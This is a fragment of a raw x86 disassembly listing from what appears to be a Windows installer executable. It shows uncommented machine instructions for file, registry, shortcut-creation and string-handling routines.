  401dce:	6a 11                	push   $0x11
  401dd0:	e8 69 0f 00 00       	call   0x402d3e
  401dd5:	eb 04                	jmp    0x401ddb
  401dd7:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401ddb:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401dde:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401de1:	50                   	push   %eax
  401de2:	ff 75 08             	push   0x8(%ebp)
  401de5:	ff 15 94 81 40 00    	call   *0x408194
  401deb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401dee:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401df3:	50                   	push   %eax
  401df4:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401df7:	0f af 45 c0          	imul   -0x40(%ebp),%eax
  401dfb:	50                   	push   %eax
  401dfc:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401dff:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  401e03:	50                   	push   %eax
  401e04:	ff 75 c8             	push   -0x38(%ebp)
  401e07:	f7 de                	neg    %esi
  401e09:	ff 75 bc             	push   -0x44(%ebp)
  401e0c:	1b f6                	sbb    %esi,%esi
  401e0e:	23 35 60 a2 42 00    	and    0x42a260,%esi
  401e14:	56                   	push   %esi
  401e15:	ff 15 6c 82 40 00    	call   *0x40826c
  401e1b:	8b f0                	mov    %eax,%esi
  401e1d:	56                   	push   %esi
  401e1e:	ff 75 c8             	push   -0x38(%ebp)
  401e21:	68 72 01 00 00       	push   $0x172
  401e26:	ff 75 08             	push   0x8(%ebp)
  401e29:	ff 15 80 82 40 00    	call   *0x408280
  401e2f:	3b c3                	cmp    %ebx,%eax
  401e31:	74 0c                	je     0x401e3f
  401e33:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401e36:	75 07                	jne    0x401e3f
  401e38:	50                   	push   %eax
  401e39:	ff 15 60 80 40 00    	call   *0x408060
  401e3f:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401e42:	0f 8c 7a 0d 00 00    	jl     0x402bc2
  401e48:	56                   	push   %esi
  401e49:	e9 1f f7 ff ff       	jmp    0x40156d
  401e4e:	ff 75 f8             	push   -0x8(%ebp)
  401e51:	ff 15 70 82 40 00    	call   *0x408270
  401e57:	6a 02                	push   $0x2
  401e59:	8b f0                	mov    %eax,%esi
  401e5b:	e8 bc 0e 00 00       	call   0x402d1c
  401e60:	59                   	pop    %ecx
  401e61:	8b d8                	mov    %eax,%ebx
  401e63:	6a 48                	push   $0x48
  401e65:	6a 5a                	push   $0x5a
  401e67:	56                   	push   %esi
  401e68:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e6b:	ff 15 54 80 40 00    	call   *0x408054
  401e71:	50                   	push   %eax
  401e72:	53                   	push   %ebx
  401e73:	ff 15 fc 80 40 00    	call   *0x4080fc
  401e79:	56                   	push   %esi
  401e7a:	ff 75 f8             	push   -0x8(%ebp)
  401e7d:	f7 d8                	neg    %eax
  401e7f:	a3 f8 cd 40 00       	mov    %eax,0x40cdf8
  401e84:	ff 15 74 82 40 00    	call   *0x408274
  401e8a:	6a 03                	push   $0x3
  401e8c:	e8 8b 0e 00 00       	call   0x402d1c
  401e91:	a3 08 ce 40 00       	mov    %eax,0x40ce08
  401e96:	8a 45 e0             	mov    -0x20(%ebp),%al
  401e99:	59                   	pop    %ecx
  401e9a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e9d:	ff 75 d4             	push   -0x2c(%ebp)
  401ea0:	8a c8                	mov    %al,%cl
  401ea2:	80 e1 01             	and    $0x1,%cl
  401ea5:	c6 05 0f ce 40 00 01 	movb   $0x1,0x40ce0f
  401eac:	88 0d 0c ce 40 00    	mov    %cl,0x40ce0c
  401eb2:	8a c8                	mov    %al,%cl
  401eb4:	80 e1 02             	and    $0x2,%cl
  401eb7:	24 04                	and    $0x4,%al
  401eb9:	68 14 ce 40 00       	push   $0x40ce14
  401ebe:	88 0d 0d ce 40 00    	mov    %cl,0x40ce0d
  401ec4:	a2 0e ce 40 00       	mov    %al,0x40ce0e
  401ec9:	e8 ab 46 00 00       	call   0x406579
  401ece:	68 f8 cd 40 00       	push   $0x40cdf8
  401ed3:	ff 15 58 80 40 00    	call   *0x408058
  401ed9:	e9 52 07 00 00       	jmp    0x402630
  401ede:	53                   	push   %ebx
  401edf:	e8 38 0e 00 00       	call   0x402d1c
  401ee4:	6a 01                	push   $0x1
  401ee6:	8b f0                	mov    %eax,%esi
  401ee8:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401eeb:	e8 2c 0e 00 00       	call   0x402d1c
  401ef0:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401ef3:	59                   	pop    %ecx
  401ef4:	59                   	pop    %ecx
  401ef5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ef8:	50                   	push   %eax
  401ef9:	56                   	push   %esi
  401efa:	75 0b                	jne    0x401f07
  401efc:	ff 15 50 82 40 00    	call   *0x408250
  401f02:	e9 bb 0c 00 00       	jmp    0x402bc2
  401f07:	ff 15 78 82 40 00    	call   *0x408278
  401f0d:	e9 b0 0c 00 00       	jmp    0x402bc2
  401f12:	53                   	push   %ebx
  401f13:	e8 26 0e 00 00       	call   0x402d3e
  401f18:	6a 31                	push   $0x31
  401f1a:	8b f0                	mov    %eax,%esi
  401f1c:	e8 1d 0e 00 00       	call   0x402d3e
  401f21:	6a 22                	push   $0x22
  401f23:	8b d8                	mov    %eax,%ebx
  401f25:	e8 14 0e 00 00       	call   0x402d3e
  401f2a:	6a 15                	push   $0x15
  401f2c:	8b f8                	mov    %eax,%edi
  401f2e:	e8 0b 0e 00 00       	call   0x402d3e
  401f33:	6a ec                	push   $0xffffffec
  401f35:	e8 e9 f4 ff ff       	call   0x401423
  401f3a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f3d:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401f43:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f46:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401f4c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f4f:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f52:	66 8b 06             	mov    (%esi),%ax
  401f55:	66 f7 d8             	neg    %ax
  401f58:	1b c0                	sbb    %eax,%eax
  401f5a:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401f5d:	23 c6                	and    %esi,%eax
  401f5f:	89 45 80             	mov    %eax,-0x80(%ebp)
  401f62:	66 8b 07             	mov    (%edi),%ax
  401f65:	66 f7 d8             	neg    %ax
  401f68:	1b c0                	sbb    %eax,%eax
  401f6a:	c7 45 8c 00 60 43 00 	movl   $0x436000,-0x74(%ebp)
  401f71:	23 c7                	and    %edi,%eax
  401f73:	89 45 88             	mov    %eax,-0x78(%ebp)
  401f76:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401f7c:	50                   	push   %eax
  401f7d:	e8 e6 3b 00 00       	call   0x405b68
  401f82:	85 c0                	test   %eax,%eax
  401f84:	0f 84 9b 09 00 00    	je     0x402925
  401f8a:	f6 85 78 ff ff ff 40 	testb  $0x40,-0x88(%ebp)
  401f91:	0f 84 2b 0c 00 00    	je     0x402bc2
  401f97:	ff 75 ac             	push   -0x54(%ebp)
  401f9a:	e8 3d 4a 00 00       	call   0x4069dc
  401f9f:	ff 75 ac             	push   -0x54(%ebp)
  401fa2:	eb 47                	jmp    0x401feb
  401fa4:	53                   	push   %ebx
  401fa5:	e8 94 0d 00 00       	call   0x402d3e
  401faa:	8b f0                	mov    %eax,%esi
  401fac:	56                   	push   %esi
  401fad:	6a eb                	push   $0xffffffeb
  401faf:	e8 f0 35 00 00       	call   0x4055a4
  401fb4:	56                   	push   %esi
  401fb5:	e8 6b 3b 00 00       	call   0x405b25
  401fba:	8b f0                	mov    %eax,%esi
  401fbc:	3b f3                	cmp    %ebx,%esi
  401fbe:	0f 84 61 09 00 00    	je     0x402925
  401fc4:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401fc7:	74 21                	je     0x401fea
  401fc9:	56                   	push   %esi
  401fca:	e8 0d 4a 00 00       	call   0x4069dc
  401fcf:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401fd2:	7c 0b                	jl     0x401fdf
  401fd4:	50                   	push   %eax
  401fd5:	ff 75 f4             	push   -0xc(%ebp)
  401fd8:	e8 a6 44 00 00       	call   0x406483
  401fdd:	eb 0b                	jmp    0x401fea
  401fdf:	3b c3                	cmp    %ebx,%eax
  401fe1:	74 07                	je     0x401fea
  401fe3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fea:	56                   	push   %esi
  401feb:	ff 15 24 81 40 00    	call   *0x408124
  401ff1:	e9 cc 0b 00 00       	jmp    0x402bc2
  401ff6:	6a 02                	push   $0x2
  401ff8:	e8 41 0d 00 00       	call   0x402d3e
  401ffd:	50                   	push   %eax
  401ffe:	e8 97 48 00 00       	call   0x40689a
  402003:	8b f0                	mov    %eax,%esi
  402005:	3b f3                	cmp    %ebx,%esi
  402007:	74 13                	je     0x40201c
  402009:	ff 76 14             	push   0x14(%esi)
  40200c:	ff 75 f4             	push   -0xc(%ebp)
  40200f:	e8 6f 44 00 00       	call   0x406483
  402014:	ff 76 18             	push   0x18(%esi)
  402017:	e9 51 f5 ff ff       	jmp    0x40156d
  40201c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40201f:	66 89 1f             	mov    %bx,(%edi)
  402022:	66 89 18             	mov    %bx,(%eax)
  402025:	e9 fb 08 00 00       	jmp    0x402925
  40202a:	6a ee                	push   $0xffffffee
  40202c:	e8 0d 0d 00 00       	call   0x402d3e
  402031:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402034:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402037:	51                   	push   %ecx
  402038:	50                   	push   %eax
  402039:	6a 0a                	push   $0xa
  40203b:	e8 f1 48 00 00       	call   0x406931
  402040:	ff d0                	call   *%eax
  402042:	8b f0                	mov    %eax,%esi
  402044:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402047:	66 89 1f             	mov    %bx,(%edi)
  40204a:	3b f3                	cmp    %ebx,%esi
  40204c:	66 89 18             	mov    %bx,(%eax)
  40204f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402056:	0f 84 66 0b 00 00    	je     0x402bc2
  40205c:	56                   	push   %esi
  40205d:	6a 40                	push   $0x40
  40205f:	ff 15 38 81 40 00    	call   *0x408138
  402065:	3b c3                	cmp    %ebx,%eax
  402067:	89 45 08             	mov    %eax,0x8(%ebp)
  40206a:	0f 84 52 0b 00 00    	je     0x402bc2
  402070:	6a 0b                	push   $0xb
  402072:	e8 ba 48 00 00       	call   0x406931
  402077:	6a 0c                	push   $0xc
  402079:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40207c:	e8 b0 48 00 00       	call   0x406931
  402081:	ff 75 08             	push   0x8(%ebp)
  402084:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402087:	56                   	push   %esi
  402088:	53                   	push   %ebx
  402089:	ff 75 c8             	push   -0x38(%ebp)
  40208c:	ff 55 c0             	call   *-0x40(%ebp)
  40208f:	85 c0                	test   %eax,%eax
  402091:	74 34                	je     0x4020c7
  402093:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  402096:	50                   	push   %eax
  402097:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40209a:	50                   	push   %eax
  40209b:	68 14 a0 40 00       	push   $0x40a014
  4020a0:	ff 75 08             	push   0x8(%ebp)
  4020a3:	ff 55 e8             	call   *-0x18(%ebp)
  4020a6:	85 c0                	test   %eax,%eax
  4020a8:	74 1d                	je     0x4020c7
  4020aa:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020ad:	ff 70 08             	push   0x8(%eax)
  4020b0:	57                   	push   %edi
  4020b1:	e8 cd 43 00 00       	call   0x406483
  4020b6:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020b9:	ff 70 0c             	push   0xc(%eax)
  4020bc:	ff 75 f4             	push   -0xc(%ebp)
  4020bf:	e8 bf 43 00 00       	call   0x406483
  4020c4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020c7:	ff 75 08             	push   0x8(%ebp)
  4020ca:	e9 3c fb ff ff       	jmp    0x401c0b
  4020cf:	39 1d 38 a3 42 00    	cmp    %ebx,0x42a338
  4020d5:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020dc:	0f 8c b9 00 00 00    	jl     0x40219b
  4020e2:	6a f0                	push   $0xfffffff0
  4020e4:	e8 55 0c 00 00       	call   0x402d3e
  4020e9:	6a 01                	push   $0x1
  4020eb:	8b f8                	mov    %eax,%edi
  4020ed:	e8 4c 0c 00 00       	call   0x402d3e
  4020f2:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4020f5:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4020f8:	74 0e                	je     0x402108
  4020fa:	57                   	push   %edi
  4020fb:	ff 15 3c 81 40 00    	call   *0x40813c
  402101:	3b c3                	cmp    %ebx,%eax
  402103:	89 45 08             	mov    %eax,0x8(%ebp)
  402106:	75 11                	jne    0x402119
  402108:	6a 08                	push   $0x8
  40210a:	53                   	push   %ebx
  40210b:	57                   	push   %edi
  40210c:	ff 15 40 81 40 00    	call   *0x408140
  402112:	3b c3                	cmp    %ebx,%eax
  402114:	89 45 08             	mov    %eax,0x8(%ebp)
  402117:	74 7b                	je     0x402194
  402119:	ff 75 bc             	push   -0x44(%ebp)
  40211c:	ff 75 08             	push   0x8(%ebp)
  40211f:	e8 7c 48 00 00       	call   0x4069a0
  402124:	8b f8                	mov    %eax,%edi
  402126:	3b fb                	cmp    %ebx,%edi
  402128:	74 39                	je     0x402163
  40212a:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40212d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402130:	74 17                	je     0x402149
  402132:	ff 75 d8             	push   -0x28(%ebp)
  402135:	e8 e9 f2 ff ff       	call   0x401423
  40213a:	ff d7                	call   *%edi
  40213c:	85 c0                	test   %eax,%eax
  40213e:	74 2d                	je     0x40216d
  402140:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402147:	eb 24                	jmp    0x40216d
  402149:	68 00 a0 40 00       	push   $0x40a000
  40214e:	68 58 ce 40 00       	push   $0x40ce58
  402153:	56                   	push   %esi
  402154:	68 00 04 00 00       	push   $0x400
  402159:	ff 75 f8             	push   -0x8(%ebp)
  40215c:	ff d7                	call   *%edi
  40215e:	83 c4 14             	add    $0x14,%esp
  402161:	eb 0a                	jmp    0x40216d
  402163:	ff 75 bc             	push   -0x44(%ebp)
  402166:	6a f7                	push   $0xfffffff7
  402168:	e8 37 34 00 00       	call   0x4055a4
  40216d:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402170:	0f 85 4c 0a 00 00    	jne    0x402bc2
  402176:	ff 75 08             	push   0x8(%ebp)
  402179:	e8 2d 1a 00 00       	call   0x403bab
  40217e:	85 c0                	test   %eax,%eax
  402180:	0f 84 3c 0a 00 00    	je     0x402bc2
  402186:	ff 75 08             	push   0x8(%ebp)
  402189:	ff 15 48 81 40 00    	call   *0x408148
  40218f:	e9 2e 0a 00 00       	jmp    0x402bc2
  402194:	6a f6                	push   $0xfffffff6
  402196:	e9 4e 01 00 00       	jmp    0x4022e9
  40219b:	6a e7                	push   $0xffffffe7
  40219d:	e9 47 01 00 00       	jmp    0x4022e9
  4021a2:	6a f0                	push   $0xfffffff0
  4021a4:	e8 95 0b 00 00       	call   0x402d3e
  4021a9:	6a df                	push   $0xffffffdf
  4021ab:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021ae:	e8 8b 0b 00 00       	call   0x402d3e
  4021b3:	6a 02                	push   $0x2
  4021b5:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021b8:	e8 81 0b 00 00       	call   0x402d3e
  4021bd:	6a cd                	push   $0xffffffcd
  4021bf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021c2:	e8 77 0b 00 00       	call   0x402d3e
  4021c7:	6a 45                	push   $0x45
  4021c9:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4021cc:	e8 6d 0b 00 00       	call   0x402d3e
  4021d1:	ff 75 bc             	push   -0x44(%ebp)
  4021d4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021d7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4021da:	8b c8                	mov    %eax,%ecx
  4021dc:	8b f8                	mov    %eax,%edi
  4021de:	8b f0                	mov    %eax,%esi
  4021e0:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4021e6:	c1 f8 10             	sar    $0x10,%eax
  4021e9:	c1 fe 0c             	sar    $0xc,%esi
  4021ec:	25 ff ff 00 00       	and    $0xffff,%eax
  4021f1:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  4021f4:	81 e7 00 80 00 00    	and    $0x8000,%edi
  4021fa:	83 e6 07             	and    $0x7,%esi
  4021fd:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402200:	e8 83 3c 00 00       	call   0x405e88
  402205:	85 c0                	test   %eax,%eax
  402207:	75 07                	jne    0x402210
  402209:	6a 21                	push   $0x21
  40220b:	e8 2e 0b 00 00       	call   0x402d3e
  402210:	8d 45 08             	lea    0x8(%ebp),%eax
  402213:	50                   	push   %eax
  402214:	68 d4 84 40 00       	push   $0x4084d4
  402219:	6a 01                	push   $0x1
  40221b:	53                   	push   %ebx
  40221c:	68 e4 84 40 00       	push   $0x4084e4
  402221:	ff 15 a0 82 40 00    	call   *0x4082a0
  402227:	3b c3                	cmp    %ebx,%eax
  402229:	0f 8c b1 00 00 00    	jl     0x4022e0
  40222f:	8b 45 08             	mov    0x8(%ebp),%eax
  402232:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402235:	52                   	push   %edx
  402236:	68 f4 84 40 00       	push   $0x4084f4
  40223b:	8b 08                	mov    (%eax),%ecx
  40223d:	50                   	push   %eax
  40223e:	ff 11                	call   *(%ecx)
  402240:	3b c3                	cmp    %ebx,%eax
  402242:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402245:	0f 8c 87 00 00 00    	jl     0x4022d2
  40224b:	8b 45 08             	mov    0x8(%ebp),%eax
  40224e:	ff 75 bc             	push   -0x44(%ebp)
  402251:	8b 08                	mov    (%eax),%ecx
  402253:	50                   	push   %eax
  402254:	ff 51 50             	call   *0x50(%ecx)
  402257:	3b fb                	cmp    %ebx,%edi
  402259:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40225c:	75 0e                	jne    0x40226c
  40225e:	8b 45 08             	mov    0x8(%ebp),%eax
  402261:	68 00 60 43 00       	push   $0x436000
  402266:	50                   	push   %eax
  402267:	8b 08                	mov    (%eax),%ecx
  402269:	ff 51 24             	call   *0x24(%ecx)
  40226c:	3b f3                	cmp    %ebx,%esi
  40226e:	74 0a                	je     0x40227a
  402270:	8b 45 08             	mov    0x8(%ebp),%eax
  402273:	56                   	push   %esi
  402274:	50                   	push   %eax
  402275:	8b 08                	mov    (%eax),%ecx
  402277:	ff 51 3c             	call   *0x3c(%ecx)
  40227a:	8b 45 08             	mov    0x8(%ebp),%eax
  40227d:	ff 75 c0             	push   -0x40(%ebp)
  402280:	8b 08                	mov    (%eax),%ecx
  402282:	50                   	push   %eax
  402283:	ff 51 34             	call   *0x34(%ecx)
  402286:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402289:	66 39 19             	cmp    %bx,(%ecx)
  40228c:	74 0d                	je     0x40229b
  40228e:	8b 45 08             	mov    0x8(%ebp),%eax
  402291:	ff 75 b0             	push   -0x50(%ebp)
  402294:	8b 10                	mov    (%eax),%edx
  402296:	51                   	push   %ecx
  402297:	50                   	push   %eax
  402298:	ff 52 44             	call   *0x44(%edx)
  40229b:	8b 45 08             	mov    0x8(%ebp),%eax
  40229e:	ff 75 f8             	push   -0x8(%ebp)
  4022a1:	8b 08                	mov    (%eax),%ecx
  4022a3:	50                   	push   %eax
  4022a4:	ff 51 2c             	call   *0x2c(%ecx)
  4022a7:	8b 45 08             	mov    0x8(%ebp),%eax
  4022aa:	ff 75 f4             	push   -0xc(%ebp)
  4022ad:	8b 08                	mov    (%eax),%ecx
  4022af:	50                   	push   %eax
  4022b0:	ff 51 1c             	call   *0x1c(%ecx)
  4022b3:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022b6:	7c 11                	jl     0x4022c9
  4022b8:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022bb:	6a 01                	push   $0x1
  4022bd:	ff 75 f0             	push   -0x10(%ebp)
  4022c0:	8b 08                	mov    (%eax),%ecx
  4022c2:	50                   	push   %eax
  4022c3:	ff 51 18             	call   *0x18(%ecx)
  4022c6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022c9:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022cc:	50                   	push   %eax
  4022cd:	8b 08                	mov    (%eax),%ecx
  4022cf:	ff 51 08             	call   *0x8(%ecx)
  4022d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d5:	50                   	push   %eax
  4022d6:	8b 08                	mov    (%eax),%ecx
  4022d8:	ff 51 08             	call   *0x8(%ecx)
  4022db:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022de:	7d 13                	jge    0x4022f3
  4022e0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4022e7:	6a f0                	push   $0xfffffff0
  4022e9:	e8 35 f1 ff ff       	call   0x401423
  4022ee:	e9 cf 08 00 00       	jmp    0x402bc2
  4022f3:	6a f4                	push   $0xfffffff4
  4022f5:	eb f2                	jmp    0x4022e9
  4022f7:	53                   	push   %ebx
  4022f8:	e8 41 0a 00 00       	call   0x402d3e
  4022fd:	6a 11                	push   $0x11
  4022ff:	8b f0                	mov    %eax,%esi
  402301:	e8 38 0a 00 00       	call   0x402d3e
  402306:	6a 23                	push   $0x23
  402308:	8b f8                	mov    %eax,%edi
  40230a:	e8 2f 0a 00 00       	call   0x402d3e
  40230f:	56                   	push   %esi
  402310:	89 45 08             	mov    %eax,0x8(%ebp)
  402313:	e8 82 45 00 00       	call   0x40689a
  402318:	85 c0                	test   %eax,%eax
  40231a:	75 0d                	jne    0x402329
  40231c:	53                   	push   %ebx
  40231d:	6a f9                	push   $0xfffffff9
  40231f:	e8 80 32 00 00       	call   0x4055a4
  402324:	e9 fc 05 00 00       	jmp    0x402925
  402329:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40232c:	56                   	push   %esi
  40232d:	89 45 90             	mov    %eax,-0x70(%ebp)
  402330:	c7 45 94 02 00 00 00 	movl   $0x2,-0x6c(%ebp)
  402337:	e8 16 42 00 00       	call   0x406552
  40233c:	57                   	push   %edi
  40233d:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  402342:	e8 0b 42 00 00       	call   0x406552
  402347:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  40234c:	8b 45 08             	mov    0x8(%ebp),%eax
  40234f:	66 8b 4d d8          	mov    -0x28(%ebp),%cx
  402353:	50                   	push   %eax
  402354:	53                   	push   %ebx
  402355:	89 75 98             	mov    %esi,-0x68(%ebp)
  402358:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40235b:	89 45 aa             	mov    %eax,-0x56(%ebp)
  40235e:	66 89 4d a0          	mov    %cx,-0x60(%ebp)
  402362:	e8 3d 32 00 00       	call   0x4055a4
  402367:	8d 45 90             	lea    -0x70(%ebp),%eax
  40236a:	50                   	push   %eax
  40236b:	ff 15 7c 81 40 00    	call   *0x40817c
  402371:	85 c0                	test   %eax,%eax
  402373:	0f 84 49 08 00 00    	je     0x402bc2
  402379:	eb a1                	jmp    0x40231c
  40237b:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  402380:	74 1d                	je     0x40239f
  402382:	68 10 00 20 00       	push   $0x200010
  402387:	6a e8                	push   $0xffffffe8
  402389:	53                   	push   %ebx
  40238a:	e8 ea 41 00 00       	call   0x406579
  40238f:	50                   	push   %eax
  402390:	e8 0d 38 00 00       	call   0x405ba2
  402395:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40239a:	e9 2e 08 00 00       	jmp    0x402bcd
  40239f:	ff 05 14 a3 42 00    	incl   0x42a314
  4023a5:	e9 18 08 00 00       	jmp    0x402bc2
  4023aa:	33 f6                	xor    %esi,%esi
  4023ac:	33 ff                	xor    %edi,%edi
  4023ae:	3b c3                	cmp    %ebx,%eax
  4023b0:	74 08                	je     0x4023ba
  4023b2:	53                   	push   %ebx
  4023b3:	e8 86 09 00 00       	call   0x402d3e
  4023b8:	8b f0                	mov    %eax,%esi
  4023ba:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4023bd:	74 09                	je     0x4023c8
  4023bf:	6a 11                	push   $0x11
  4023c1:	e8 78 09 00 00       	call   0x402d3e
  4023c6:	8b f8                	mov    %eax,%edi
  4023c8:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4023cb:	74 09                	je     0x4023d6
  4023cd:	6a 22                	push   $0x22
  4023cf:	e8 6a 09 00 00       	call   0x402d3e
  4023d4:	8b d8                	mov    %eax,%ebx
  4023d6:	6a cd                	push   $0xffffffcd
  4023d8:	e8 61 09 00 00       	call   0x402d3e
  4023dd:	50                   	push   %eax
  4023de:	53                   	push   %ebx
  4023df:	57                   	push   %edi
  4023e0:	56                   	push   %esi
  4023e1:	ff 15 4c 81 40 00    	call   *0x40814c
  4023e7:	e9 c8 f1 ff ff       	jmp    0x4015b4
  4023ec:	a1 10 a0 40 00       	mov    0x40a010,%eax
  4023f1:	6a 01                	push   $0x1
  4023f3:	89 45 08             	mov    %eax,0x8(%ebp)
  4023f6:	e8 43 09 00 00       	call   0x402d3e
  4023fb:	6a 12                	push   $0x12
  4023fd:	8b f0                	mov    %eax,%esi
  4023ff:	e8 3a 09 00 00       	call   0x402d3e
  402404:	6a dd                	push   $0xffffffdd
  402406:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402409:	e8 30 09 00 00       	call   0x402d3e
  40240e:	50                   	push   %eax
  40240f:	68 ff 03 00 00       	push   $0x3ff
  402414:	8d 45 08             	lea    0x8(%ebp),%eax
  402417:	57                   	push   %edi
  402418:	50                   	push   %eax
  402419:	ff 75 f0             	push   -0x10(%ebp)
  40241c:	56                   	push   %esi
  40241d:	ff 15 50 81 40 00    	call   *0x408150
  402423:	66 83 3f 0a          	cmpw   $0xa,(%edi)
  402427:	e9 25 f3 ff ff       	jmp    0x401751
  40242c:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40242f:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402432:	75 2b                	jne    0x40245f
  402434:	6a 02                	push   $0x2
  402436:	e8 43 09 00 00       	call   0x402d7e
  40243b:	8b f0                	mov    %eax,%esi
  40243d:	3b f3                	cmp    %ebx,%esi
  40243f:	0f 84 e0 04 00 00    	je     0x402925
  402445:	6a 33                	push   $0x33
  402447:	e8 f2 08 00 00       	call   0x402d3e
  40244c:	50                   	push   %eax
  40244d:	56                   	push   %esi
  40244e:	ff 15 14 80 40 00    	call   *0x408014
  402454:	56                   	push   %esi
  402455:	8b f8                	mov    %eax,%edi
  402457:	ff 15 10 80 40 00    	call   *0x408010
  40245d:	eb 16                	jmp    0x402475
  40245f:	6a 22                	push   $0x22
  402461:	e8 d8 08 00 00       	call   0x402d3e
  402466:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402469:	d1 f9                	sar    $1,%ecx
  40246b:	51                   	push   %ecx
  40246c:	50                   	push   %eax
  40246d:	56                   	push   %esi
  40246e:	e8 89 09 00 00       	call   0x402dfc
  402473:	8b f8                	mov    %eax,%edi
  402475:	3b fb                	cmp    %ebx,%edi
  402477:	0f 84 45 07 00 00    	je     0x402bc2
  40247d:	e9 a3 04 00 00       	jmp    0x402925
  402482:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402485:	8b f8                	mov    %eax,%edi
  402487:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40248a:	6a 02                	push   $0x2
  40248c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40248f:	e8 aa 08 00 00       	call   0x402d3e
  402494:	6a 11                	push   $0x11
  402496:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402499:	e8 a0 08 00 00       	call   0x402d3e
  40249e:	6a 02                	push   $0x2
  4024a0:	50                   	push   %eax
  4024a1:	57                   	push   %edi
  4024a2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4024a9:	e8 20 09 00 00       	call   0x402dce
  4024ae:	3b c3                	cmp    %ebx,%eax
  4024b0:	89 45 08             	mov    %eax,0x8(%ebp)
  4024b3:	0f 84 09 07 00 00    	je     0x402bc2
  4024b9:	33 c0                	xor    %eax,%eax
  4024bb:	83 fe 01             	cmp    $0x1,%esi
  4024be:	bf f8 b5 40 00       	mov    $0x40b5f8,%edi
  4024c3:	75 11                	jne    0x4024d6
  4024c5:	6a 23                	push   $0x23
  4024c7:	e8 72 08 00 00       	call   0x402d3e
  4024cc:	57                   	push   %edi
  4024cd:	e8 80 40 00 00       	call   0x406552
  4024d2:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4024d6:	83 fe 04             	cmp    $0x4,%esi
  4024d9:	75 12                	jne    0x4024ed
  4024db:	6a 03                	push   $0x3
  4024dd:	e8 3a 08 00 00       	call   0x402d1c
  4024e2:	59                   	pop    %ecx
  4024e3:	a3 f8 b5 40 00       	mov    %eax,0x40b5f8
  4024e8:	56                   	push   %esi
